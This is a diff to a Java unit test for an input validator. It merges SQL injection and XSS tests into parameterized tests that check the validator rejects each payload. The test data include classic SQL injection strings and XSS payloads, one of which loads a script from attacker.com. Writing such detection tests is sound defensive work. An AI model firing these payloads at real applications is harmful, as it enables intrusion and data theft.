@@ -19,6 +19,8 @@
 package org.eclipse.ecsp.gateway.utils;
 
 import org.junit.jupiter.api.Test;
+import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.ValueSource;
 
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertTrue;
@@ -109,46 +111,14 @@ class InputValidatorTest {
      * Test expected result  - Returns false (attack detected).
      * Test type             - Negative.
      */
-    @Test
-    void isValidSqlInjectionUnionSelectReturnsFalse() {
+    @ParameterizedTest
+    @ValueSource(strings = {
+        "' UNION SELECT * FROM users--",
+        "' or 1=1--",
+        "admin'--"
+    })
+    void isValidSqlInjectionUnionSelectReturnsFalse(String sqlInjection) {
         // GIVEN: SQL injection with UNION SELECT
-        String sqlInjection = "' UNION SELECT * FROM users--";
-
-        // WHEN: Validation is performed
-        boolean result = InputValidator.isValid(sqlInjection);
-
-        // THEN: Should detect attack
-        assertFalse(result);
-    }
-
-    /**
-     * Test purpose          - Verify SQL injection detection with OR condition.
-     * Test data             - SQL OR true pattern.
-     * Test expected result  - Returns false (attack detected).
-     * Test type             - Negative.
-     */
-    @Test
-    void isValidSqlInjectionOrTrueReturnsFalse() {
-        // GIVEN: SQL injection with OR condition
-        String sqlInjection = "' or 1=1--";
-
-        // WHEN: Validation is performed
-        boolean result = InputValidator.isValid(sqlInjection);
-
-        // THEN: Should detect attack
-        assertFalse(result);
-    }
-
-    /**
-     * Test purpose          - Verify SQL injection detection with comment.
-     * Test data             - SQL comment pattern.
-     * Test expected result  - Returns false (attack detected).
-     * Test type             - Negative.
-     */
-    @Test
-    void isValidSqlInjectionWithCommentReturnsFalse() {
-        // GIVEN: SQL injection with comment
-        String sqlInjection = "admin'--";
 
         // WHEN: Validation is performed
         boolean result = InputValidator.isValid(sqlInjection);
@@ -163,29 +133,13 @@ class InputValidatorTest {
      * Test expected result  - Returns false (attack detected).
      * Test type             - Negative.
      */
-    @Test
-    void isValidXssWithScriptTagReturnsFalse() {
-        // GIVEN: XSS attack with script tag
-        String xssAttack = "<script>alert('XSS')</script>";
-
-        // WHEN: Validation is performed
-        boolean result = InputValidator.isValid(xssAttack);
-
-        // THEN: Should detect attack
-        assertFalse(result);
-    }
-
-    /**
-     * Test purpose          - Verify XSS detection with event handler.
-     * Test data             - XSS with onerror event.
-     * Test expected result  - Returns false (attack detected).
-     * Test type             - Negative.
-     */
-    @Test
-    void isValidXssWithOnerrorReturnsFalse() {
-        // GIVEN: XSS attack with onerror
-        String xssAttack = "<img src=x onerror=alert('XSS')>";
-
+    @ParameterizedTest
+    @ValueSource(strings = {
+        "<script>alert('XSS')</script>",
+        "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
+        "<img src=x onerror=alert('XSS')>"
+    })
+    void isValidXssWithScriptTagReturnsFalse(String xssAttack) {
         // WHEN: Validation is performed
         boolean result = InputValidator.isValid(xssAttack);
 
